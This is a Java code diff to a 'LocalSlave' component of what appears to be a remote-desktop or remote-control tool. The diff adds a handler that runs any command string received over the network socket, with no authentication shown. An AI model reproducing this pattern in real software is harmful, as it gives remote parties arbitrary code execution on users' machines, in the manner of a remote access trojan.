@@ -48,7 +48,7 @@ public class LocalSlave extends Slave {
 
 		setHost(System.getProperty("user.name"));
 		setOS(System.getProperty("os.name") + "_" + System.getProperty("os.arch"));
-		setVersion(REMOTE_VERSION);
+		setVersion(VERSION);
 
 		final int PORT = 43596;
 
@@ -95,26 +95,46 @@ public class LocalSlave extends Slave {
 			if (intent == INTENT_CONNECT) {
 				dos.writeShort(robot.getZoom(robot.getBounds().width));
 				dos.writeShort(robot.getZoom(robot.getBounds().height));
-				cap.start();
+
 				new Thread(new Runnable() {
 					@Override
 					public void run() {
 						try {
 							int op;
 							while ((op = dis.read()) != -1) {
+								System.out.println("op: " + op);
 								switch (op) {
 								case INTENT_REBUILD:
 									cap.stop();
 									ssock.close();
 									System.exit(0);
 								break;
+								case OP_DO_COMMAND:
+									String cmd = dis.readUTF();
+									System.out.print("EXEC: " + cmd + "..");
+									String[] args = cmd.split(" ");
+									try {
+										new ProcessBuilder(args).start();
+										System.out.println("success.");
+									}
+									catch (Throwable t) {
+										System.out.println("fail.");
+									}
+
+								break;
 								}
 							}
 						}
 						catch (Throwable t) {
+							try {
+								sock.close();
+							}
+							catch (IOException e) {
+							}
 						}
 					}
 				}).start();
+				cap.start();
 			}
 		}
 	}
